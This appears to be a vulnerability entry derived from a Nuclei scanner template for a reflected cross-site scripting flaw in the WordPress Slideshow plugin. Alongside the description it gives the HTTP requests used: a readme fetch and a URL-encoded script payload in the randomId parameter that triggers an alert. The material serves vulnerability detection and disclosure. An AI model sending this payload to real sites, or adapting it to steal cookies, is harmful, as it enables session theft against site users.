# Vulnerability: WordPress Slideshow - Cross-Site Scripting
**Classification:** CWE-79
**Source:** Nuclei Template (`wp-slideshow-xss.yaml`)

## Description
WordPress Slideshow plugin contains multiple cross-site scripting vulnerabilities. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /wp-content/plugins/slideshow-jquery-image-gallery/readme.txt HTTP/1.1
Host: {{Hostname}}

GET {{BaseURL}}/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?randomId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

